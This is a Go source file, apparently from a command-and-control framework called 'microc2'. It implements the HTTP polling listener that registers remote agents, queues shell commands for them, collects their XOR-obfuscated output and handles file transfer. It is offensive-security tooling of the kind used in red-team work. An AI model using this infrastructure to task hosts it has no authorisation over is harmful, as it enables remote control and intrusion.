// This file will be moved to the new 'behaviour' folder as 'static_polling.go'.
package behaviour

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"microc2/server/internal/common"
	"microc2/server/internal/filestore"
	"microc2/server/internal/tasks"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

type HTTPPollingProtocol struct {
	config    common.BaseProtocolConfig
	mux       *http.ServeMux
	taskStore *tasks.Store
	results   struct {
		sync.Mutex
		history map[string][]CommandResult // AgentID -> []CommandResult
	}
	agents struct {
		sync.Mutex
		list map[string]*Agent
	}
}

type CommandResult struct {
	Command   string `json:"command"`
	Output    string `json:"output"`
	Timestamp string `json:"timestamp"`
}

type Agent struct {
	ID        string    `json:"id"`
	PayloadID string    `json:"payload_id,omitempty"`
	OS        string    `json:"os"`
	Hostname  string    `json:"hostname"`
	IP        string    `json:"ip"`
	IPList    []string  `json:"ip_list,omitempty"`
	LastSeen  time.Time `json:"last_seen"`
	Commands  []string  `json:"last_commands"`
}

// NewHTTPPollingProtocol creates a new HTTP polling protocol instance
func NewHTTPPollingProtocol(config common.BaseProtocolConfig) *HTTPPollingProtocol {
	p := &HTTPPollingProtocol{
		config:    config,
		mux:       http.NewServeMux(),
		taskStore: tasks.NewStore(),
		agents: struct {
			sync.Mutex
			list map[string]*Agent
		}{list: make(map[string]*Agent)},
	}
	p.results.history = make(map[string][]CommandResult)
	p.registerRoutes()
	return p
}

func (p *HTTPPollingProtocol) registerRoutes() {
	// Register agent communication routes with /api prefix
	p.mux.HandleFunc("/api/agent/", func(w http.ResponseWriter, r *http.Request) {
		// log.Printf("[DEBUG] /api/agent/ handler triggered: %s %s", r.Method, r.URL.Path)
		p.handleAgentRequests(w, r)
	})
	p.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// log.Printf("[DEBUG] Unmatched HTTP request: %s %s", r.Method, r.URL.Path)
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("404 not found"))
	})
	// log.Printf("[DEBUG] Registered agent routes on HTTP polling protocol (mux: %p)", p.mux)
}

// GetHTTPHandler returns the ServeMux that handles HTTP requests
func (p *HTTPPollingProtocol) GetHTTPHandler() http.Handler {
	// log.Printf("[DEBUG] GetHTTPHandler called for HTTPPollingProtocol (mux: %p)", p.mux)
	return p.mux
}

func (p *HTTPPollingProtocol) handleAgentRequests(w http.ResponseWriter, r *http.Request) {
	p.enableCors(w, r)

	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 4 || parts[0] != "api" || parts[1] != "agent" {
		http.Error(w, "Invalid request path", http.StatusBadRequest)
		return
	}
	agentID := parts[2]
	if err := tasks.ValidateIdentifier("agent_id", agentID); err != nil {
		writeTaskError(w, err)
		return
	}
	action := parts[3]
	switch action {
	case "heartbeat":
		if len(parts) != 4 {
			http.Error(w, "Invalid request path", http.StatusBadRequest)
			return
		}
		p.handleAgentHeartbeat(w, r, agentID)
	case "tasks":
		switch {
		case len(parts) == 4:
			p.handleAgentTasks(w, r, agentID)
		case len(parts) == 6 && parts[5] == "status":
			p.handleAgentTaskStatus(w, r, agentID, parts[4])
		default:
			http.Error(w, "Invalid task request path", http.StatusBadRequest)
		}
	case "results":
		if len(parts) != 4 {
			http.Error(w, "Invalid request path", http.StatusBadRequest)
			return
		}
		p.handleTypedAgentResult(w, r, agentID)
	case "command":
		if len(parts) != 4 {
			http.Error(w, "Invalid request path", http.StatusBadRequest)
			return
		}
		p.handleGetCommand(w, r)
	case "result":
		if len(parts) != 4 {
			http.Error(w, "Invalid request path", http.StatusBadRequest)
			return
		}
		p.handleLegacyAgentResult(w, r, agentID)
	default:
		log.Print("[ERROR] Unknown agent action")
		http.Error(w, "Unknown action", http.StatusNotFound)
	}
}

func (p *HTTPPollingProtocol) HandleAgentRequests(w http.ResponseWriter, r *http.Request) {
	p.handleAgentRequests(w, r)
}

func (p *HTTPPollingProtocol) handleAgentHeartbeat(w http.ResponseWriter, r *http.Request, AgentID string) {
	p.enableCors(w, r)

	// Handle preflight OPTIONS request
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method != http.MethodPost {
		log.Printf("[ERROR] Invalid method %s for agent %s heartbeat", r.Method, AgentID)
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// log.Printf("[DEBUG] Processing heartbeat from agent %s", AgentID)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("[ERROR] Failed to read heartbeat body from agent %s: %v", AgentID, err)
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}

	if err := p.processAgentHeartbeat(body, AgentID); err != nil {
		log.Printf("[ERROR] Failed to process heartbeat from agent %s: %v", AgentID, err)
		http.Error(w, fmt.Sprintf("Error processing agent data: %v", err), http.StatusBadRequest)
		return
	}

	log.Printf("[INFO] Successfully processed heartbeat from agent %s", AgentID)
	// Build JSON response and include Content-Length
	response := map[string]string{"status": "connected", "time": time.Now().UTC().Format(time.RFC3339)}
	respBytes, err := json.Marshal(response)
	if err != nil {
		log.Printf("[ERROR] Failed to marshal response for agent %s: %v", AgentID, err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Length", strconv.Itoa(len(respBytes)))
	w.Write(respBytes)
}

func (p *HTTPPollingProtocol) handleAgentTasks(w http.ResponseWriter, r *http.Request, agentID string) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	task, ok, err := p.taskStore.DispatchNext(agentID)
	if err != nil {
		writeTaskError(w, err)
		return
	}
	if !ok {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(task); err != nil {
		log.Printf("[ERROR] Failed to encode task %s for agent %s: %v", task.ID, agentID, err)
	}
}

func (p *HTTPPollingProtocol) handleAgentTaskStatus(w http.ResponseWriter, r *http.Request, agentID, taskID string) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := tasks.ValidateIdentifier("task_id", taskID); err != nil {
		writeTaskError(w, err)
		return
	}

	var update tasks.StatusUpdate
	if err := decodeStrictJSON(w, r, &update, tasks.MaxStatusUpdateBodyBytes); err != nil {
		writeJSONDecodeError(w, "Invalid task status update", err)
		return
	}
	task, err := p.taskStore.MarkRunning(agentID, taskID, update)
	if err != nil {
		writeTaskError(w, err)
		return
	}
	writeTaskJSON(w, http.StatusOK, task)
}

func (p *HTTPPollingProtocol) handleTypedAgentResult(w http.ResponseWriter, r *http.Request, agentID string) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var result tasks.Result
	if err := decodeStrictJSON(w, r, &result, tasks.MaxTaskResultBodyBytes); err != nil {
		writeJSONDecodeError(w, "Invalid task result", err)
		return
	}
	task, completion, err := p.taskStore.CompleteWithInfo(agentID, result)
	if err != nil {
		writeTaskError(w, err)
		return
	}
	if completion.LegacyOrigin && completion.Applied {
		p.recordLegacyResultForAgent(agentID, projectTypedTaskToLegacyResult(task))
	}
	writeTaskJSON(w, http.StatusOK, task)
}

func (p *HTTPPollingProtocol) handleLegacyAgentResult(w http.ResponseWriter, r *http.Request, agentID string) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var result CommandResult
	if err := decodeStrictJSON(w, r, &result, tasks.MaxLegacyResultBodyBytes); err != nil {
		writeJSONDecodeError(w, "Invalid result format", err)
		return
	}
	if strings.TrimSpace(result.Command) == "" {
		http.Error(w, "Invalid result format", http.StatusBadRequest)
		return
	}
	result.Timestamp = time.Now().UTC().Format(time.RFC3339)

	deobfuscatedOutput, err := common.XORDeobfuscate(result.Output, agentID)
	if err != nil {
		log.Printf("[AGENT] Failed to deobfuscate legacy result from %s: %v. Storing raw output.", agentID, err)
	} else {
		result.Output = deobfuscatedOutput
	}

	if _, matched, err := p.taskStore.CompleteLegacy(agentID, result.Command, result.Output); err != nil {
		writeTaskError(w, err)
		return
	} else if matched {
		p.recordLegacyResultForAgent(agentID, result)
	}
	w.WriteHeader(http.StatusOK)
}

// Start implements the Protocol interface
func (p *HTTPPollingProtocol) Start() error {
	// log.Printf("[DEBUG] Starting HTTP polling protocol")
	return nil
}

// Stop implements the Protocol interface
func (p *HTTPPollingProtocol) Stop() error {
	// log.Printf("[DEBUG] Stopping HTTP polling protocol")
	return nil
}

func (p *HTTPPollingProtocol) Initialize() error {
	return os.MkdirAll(p.config.UploadDir, 0755)
}

func (p *HTTPPollingProtocol) HandleFileUpload(filename string, fileData io.Reader) error {
	if err := filestore.ValidateFileName(filename); err != nil {
		return err
	}
	filePath := filepath.Join(p.config.UploadDir, filename)
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.Copy(file, fileData)
	return err
}

func (p *HTTPPollingProtocol) HandleFileDownload(filename string) (io.Reader, error) {
	if err := filestore.ValidateFileName(filename); err != nil {
		return nil, err
	}
	return os.Open(filepath.Join(p.config.UploadDir, filename))
}

func (p *HTTPPollingProtocol) processAgentHeartbeat(agentData []byte, expectedAgentID string) error {
	var agent Agent
	if err := json.Unmarshal(agentData, &agent); err != nil {
		log.Printf("[ERROR] Failed to unmarshal agent heartbeat: %v", err)
		return fmt.Errorf("failed to unmarshal agent data: %w", err)
	}
	if strings.TrimSpace(agent.ID) == "" {
		return fmt.Errorf("agent id is required")
	}
	if expectedAgentID != "" && agent.ID != expectedAgentID {
		return fmt.Errorf("agent id mismatch: path %q, body %q", expectedAgentID, agent.ID)
	}

	p.agents.Lock()
	defer p.agents.Unlock()
	agent.LastSeen = time.Now()
	p.agents.list[agent.ID] = &agent
	log.Printf("[DEBUG] Agent %s added/updated in list. Total agents: %d", agent.ID, len(p.agents.list))
	return nil
}

// Restore the interface method for Protocol compatibility
func (p *HTTPPollingProtocol) HandleAgentHeartbeat(agentData []byte) error {
	return p.processAgentHeartbeat(agentData, "")
}

// Remove handleSubmitResult from GetRoutes, as it no longer exists or is needed.
func (p *HTTPPollingProtocol) GetRoutes() map[string]http.HandlerFunc {
	return map[string]http.HandlerFunc{
		"/queue_command": p.handleQueueCommand,
		"/get_command":   p.handleGetCommand,
		"/get_results":   p.handleGetResults,
		"/files/upload":  p.handleFileUpload,
		"/files/list":    p.handleListFiles,
		"/agent/list":    p.handleListAgents,
	}
}

// defaultAllowedOrigins applies to polling protocols created without an
// explicit CORS configuration (e.g. dynamically created listeners).
var defaultAllowedOrigins []string

// SetDefaultAllowedOrigins configures the fallback CORS allow list for
// polling protocols that were created without explicit origins.
func SetDefaultAllowedOrigins(origins []string) {
	defaultAllowedOrigins = origins
}

func (p *HTTPPollingProtocol) allowedOrigins() []string {
	if p.config.AllowedOrigins != nil {
		return p.config.AllowedOrigins
	}
	return defaultAllowedOrigins
}

// enableCors reflects the request Origin only when it is allowed by the
// configured origins. The wildcard "*" is only emitted when it is explicitly
// configured as an escape hatch; otherwise disallowed origins get no CORS
// headers at all.
func (p *HTTPPollingProtocol) enableCors(w http.ResponseWriter, r *http.Request) {
	origin := r.Header.Get("Origin")
	if origin == "" {
		return
	}
	allowed := p.allowedOrigins()
	wildcard := false
	for _, entry := range allowed {
		if entry == "*" {
			wildcard = true
			break
		}
	}
	switch {
	case wildcard:
		w.Header().Set("Access-Control-Allow-Origin", "*")
	case common.IsOriginAllowed(origin, r.Host, allowed):
		w.Header().Set("Access-Control-Allow-Origin", origin)
		w.Header().Add("Vary", "Origin")
	default:
		return
	}
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Filename, X-Command")
	w.Header().Set("Access-Control-Max-Age", "86400")
}

// HTTP Handlers
// Dummy HandleCommand to satisfy Protocol interface
func (p *HTTPPollingProtocol) HandleCommand(cmd string) error {
	log.Printf("[WARN] HandleCommand called without agent context; use QueueCommand(AgentID, cmd) instead.")
	return nil
}

// Update handleQueueCommand to do nothing or return an error (since it's not used for agent commands)
func (p *HTTPPollingProtocol) handleQueueCommand(w http.ResponseWriter, r *http.Request) {
	p.enableCors(w, r)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	// This endpoint is deprecated; use the API server to queue commands per agent.
	http.Error(w, "Use /api/agents/{AgentID}/command via API server", http.StatusNotImplemented)
}

func (p *HTTPPollingProtocol) handleGetCommand(w http.ResponseWriter, r *http.Request) {
	p.enableCors(w, r)
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) != 4 {
		http.Error(w, "Invalid request path", http.StatusBadRequest)
		return
	}
	agentID := parts[2]
	task, ok, err := p.taskStore.DispatchNextLegacy(agentID)
	if err != nil {
		writeTaskError(w, err)
		return
	}
	if !ok {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"command": task.Arguments.Command})
}

func (p *HTTPPollingProtocol) handleGetResults(w http.ResponseWriter, r *http.Request) {
	p.enableCors(w, r)
	w.Header().Set("Content-Type", "application/json")

	// Extract AgentID from URL: /api/agent/{AgentID}/results
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 5 {
		http.Error(w, "Invalid request path", http.StatusBadRequest)
		return
	}
	AgentID := parts[3]

	p.results.Lock()
	history := p.results.history[AgentID]
	p.results.Unlock()

	// log.Printf("[TRACE] handleGetResults: Results history length for agent %s: %d", AgentID, len(history))

	if len(history) == 0 {
		// log.Printf("[TRACE] handleGetResults: No results to return for agent %s", AgentID)
		w.Write([]byte("[]"))
		return
	}

	// for i, res := range history {
	// log.Printf("[TRACE] handleGetResults: Returning result %d for agent %s: %+v", i, AgentID, res)
	// }

	json.NewEncoder(w).Encode(history)
}

func (p *HTTPPollingProtocol) handleFileUpload(w http.ResponseWriter, r *http.Request) {
	p.enableCors(w, r)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	filename := r.Header.Get("X-Filename")
	if filename == "" {
		http.Error(w, "Missing X-Filename header", http.StatusBadRequest)
		return
	}
	if err := filestore.ValidateFileName(filename); err != nil {
		http.Error(w, "Invalid X-Filename header", http.StatusBadRequest)
		return
	}

	if err := p.HandleFileUpload(filename, r.Body); err != nil {
		log.Printf("Error handling file upload: %v", err)
		http.Error(w, "Failed to handle file upload", http.StatusInternalServerError)
		return
	}
}

func (p *HTTPPollingProtocol) handleListFiles(w http.ResponseWriter, r *http.Request) {
	p.enableCors(w, r)
	files, err := os.ReadDir(p.config.UploadDir)
	if err != nil {
		http.Error(w, "Failed to list files", http.StatusInternalServerError)
		return
	}

	type FileInfo struct {
		Name    string `json:"name"`
		Size    int64  `json:"size"`
		ModTime string `json:"modified"`
	}

	var fileList []FileInfo
	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}
		fileList = append(fileList, FileInfo{
			Name:    file.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(fileList)
}

func (p *HTTPPollingProtocol) handleListAgents(w http.ResponseWriter, r *http.Request) {
	p.enableCors(w, r)
	p.agents.Lock()
	defer p.agents.Unlock()

	// Clean up stale agents (not seen in last 5 minutes)
	for id, agent := range p.agents.list {
		if time.Since(agent.LastSeen) > 5*time.Minute {
			delete(p.agents.list, id)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(p.agents.list)
}

// GetAllAgents returns a map of all agents for aggregation
func (p *HTTPPollingProtocol) GetAllAgents() map[string]interface{} {
	p.agents.Lock()
	defer p.agents.Unlock()
	result := make(map[string]interface{}, len(p.agents.list))
	for id, agent := range p.agents.list {
		result[id] = agent
	}
	return result
}

func (p *HTTPPollingProtocol) AgentLastSeen(agentID string) (time.Time, bool) {
	p.agents.Lock()
	defer p.agents.Unlock()
	agent, ok := p.agents.list[agentID]
	if !ok || agent == nil {
		return time.Time{}, false
	}
	return agent.LastSeen, true
}

// QueueCommand is the deprecated raw-command adapter. The command is recorded
// as a typed shell task so both old and v1 agents share one lifecycle store.
func (p *HTTPPollingProtocol) QueueCommand(agentID, command string) {
	if _, err := p.taskStore.CreateLegacyShell(agentID, command); err != nil {
		log.Printf("[WARN] Failed to queue legacy command for agent %s: %v", agentID, err)
	}
}

func (p *HTTPPollingProtocol) QueueLegacyShellTask(agentID, command string) (tasks.Task, error) {
	return p.taskStore.CreateLegacyShell(agentID, command)
}

func (p *HTTPPollingProtocol) CreateTask(agentID string, createRequest tasks.CreateRequest) (tasks.Task, error) {
	return p.taskStore.Create(agentID, createRequest)
}

func (p *HTTPPollingProtocol) ListTasks(agentID string) ([]tasks.Task, error) {
	return p.taskStore.List(agentID)
}

func (p *HTTPPollingProtocol) CancelTask(agentID, taskID string) (tasks.Task, error) {
	return p.taskStore.Cancel(agentID, taskID)
}

func (p *HTTPPollingProtocol) GetTask(agentID, taskID string) (tasks.Task, error) {
	return p.taskStore.Get(agentID, taskID)
}

// Exported method to get results history keys for debugging
func (p *HTTPPollingProtocol) GetResultsHistoryKeys() []string {
	p.results.Lock()
	defer p.results.Unlock()
	keys := make([]string, 0, len(p.results.history))
	for k := range p.results.history {
		keys = append(keys, k)
	}
	return keys
}

func (p *HTTPPollingProtocol) GetResults(AgentID string) []map[string]interface{} {
	// log.Printf("[DEBUG] GetResults called for AgentID=%s", AgentID)
	p.results.Lock()
	defer p.results.Unlock()
	// Log keys directly to avoid deadlock
	keys := make([]string, 0, len(p.results.history))
	for k := range p.results.history {
		keys = append(keys, k)
	}
	// log.Printf("[DEBUG] Results history keys: %v", keys)
	history := p.results.history[AgentID]
	// log.Printf("[DEBUG] Results history for AgentID=%s: %+v", AgentID, history)
	var results []map[string]interface{}
	for _, res := range history {
		results = append(results, map[string]interface{}{
			"command":   res.Command,
			"output":    res.Output,
			"timestamp": res.Timestamp,
		})
	}
	// log.Printf("[DEBUG] Returning %d results for AgentID=%s", len(results), AgentID)
	return results
}

// GetResultsPage returns a bounded slice of deprecated command results and the
// total retained count. The slice is copied while holding the result lock, so
// callers never need to materialize or race over the full listener history.
func (p *HTTPPollingProtocol) GetResultsPage(
	agentID string,
	offset int,
	limit int,
) ([]map[string]interface{}, int) {
	p.results.Lock()
	defer p.results.Unlock()

	history := p.results.history[agentID]
	total := len(history)
	if offset < 0 {
		offset = 0
	}
	if offset > total {
		offset = total
	}
	if limit < 0 {
		limit = 0
	}
	available := total - offset
	if limit > available {
		limit = available
	}
	end := offset + limit
	results := make([]map[string]interface{}, 0, limit)
	for _, result := range history[offset:end] {
		results = append(results, map[string]interface{}{
			"command":   result.Command,
			"output":    result.Output,
			"timestamp": result.Timestamp,
		})
	}
	return results, total
}

func (p *HTTPPollingProtocol) recordLegacyResultForAgent(agentID string, result CommandResult) {
	p.results.Lock()
	defer p.results.Unlock()
	history := p.results.history[agentID]
	if len(history) >= tasks.MaxTaskHistoryPerAgent {
		history = append([]CommandResult(nil), history[len(history)-tasks.MaxTaskHistoryPerAgent+1:]...)
	}
	p.results.history[agentID] = append(history, result)
}

func projectTypedTaskToLegacyResult(task tasks.Task) CommandResult {
	result := CommandResult{
		Command: task.Arguments.Command,
	}
	if task.CompletedAt != nil {
		result.Timestamp = task.CompletedAt.UTC().Format(time.RFC3339)
	} else {
		result.Timestamp = time.Now().UTC().Format(time.RFC3339)
	}
	if task.Result != nil {
		result.Output = task.Result.Output.Stdout + task.Result.Output.Stderr
		if task.Result.Outcome == tasks.OutcomeFailed && task.Result.Error != "" {
			errorOutput := task.Result.Error
			if !strings.HasPrefix(strings.TrimSpace(errorOutput), "Error:") {
				errorOutput = "Error: " + errorOutput
			}
			if result.Output == "" {
				result.Output = errorOutput
			} else {
				result.Output += "\n" + errorOutput
			}
		}
	}
	return result
}

func decodeStrictJSON(
	w http.ResponseWriter,
	r *http.Request,
	destination interface{},
	maxBytes int64,
) error {
	r.Body = http.MaxBytesReader(w, r.Body, maxBytes)
	decoder := json.NewDecoder(r.Body)
	decoder.DisallowUnknownFields()
	if err := decoder.Decode(destination); err != nil {
		return err
	}
	var trailing interface{}
	if err := decoder.Decode(&trailing); !errors.Is(err, io.EOF) {
		if err == nil {
			return fmt.Errorf("request body must contain exactly one JSON value")
		}
		return err
	}
	return nil
}

func writeJSONDecodeError(w http.ResponseWriter, message string, err error) {
	var maxBytesError *http.MaxBytesError
	if errors.As(err, &maxBytesError) {
		http.Error(w, message+": request body too large", http.StatusRequestEntityTooLarge)
		return
	}
	http.Error(w, message+": "+err.Error(), http.StatusBadRequest)
}

func writeTaskError(w http.ResponseWriter, err error) {
	switch {
	case tasks.IsValidationError(err):
		http.Error(w, err.Error(), http.StatusBadRequest)
	case errors.Is(err, tasks.ErrNotFound):
		http.Error(w, err.Error(), http.StatusNotFound)
	case errors.Is(err, tasks.ErrInvalidTransition):
		http.Error(w, err.Error(), http.StatusConflict)
	case errors.Is(err, tasks.ErrCapacity):
		http.Error(w, err.Error(), http.StatusTooManyRequests)
	default:
		http.Error(w, "Task operation failed", http.StatusInternalServerError)
	}
}

func writeTaskJSON(w http.ResponseWriter, status int, value interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	if err := json.NewEncoder(w).Encode(value); err != nil {
		log.Printf("[ERROR] Failed to encode task response: %v", err)
	}
}
